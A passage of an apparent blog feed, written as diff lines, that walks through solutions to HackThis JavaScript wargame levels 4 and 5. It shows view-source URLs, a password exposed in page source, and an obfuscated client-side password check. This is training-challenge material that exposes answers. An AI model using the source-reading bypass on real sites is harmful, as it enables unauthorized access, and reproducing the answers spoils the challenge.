+</pre></td><td class='code'><pre><code class=''><span class='line'>view-source:https://www.hackthis.co.uk/levels/javascript/4</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;div class='level-form'&gt;
+</span><span class='line'>    &lt;script&gt; document.location = '?input'; &lt;/script&gt;
+</span><span class='line'>    &lt;div class='center'&gt;The password is: smellthecheese&lt;/div&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;/div&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Javascript Level 5</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>view-source:https://www.hackthis.co.uk/levels/javascript/5</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript' src='https://hackthis-10af.kxcdn.com/files/js/min/extra_48d468a93b.js?1429997775'&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>a=window.location.host+"";b=a.length;c=4+((5*10)*2);d=String.fromCharCode(c,-(41-Math.floor(1806/13)),Math.sqrt(b-2)*29,(b*8)-29);p=prompt("Password:","");if(p==d){window.location="?pass="+p;}else{window.location="/levels/";}</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+</feed>
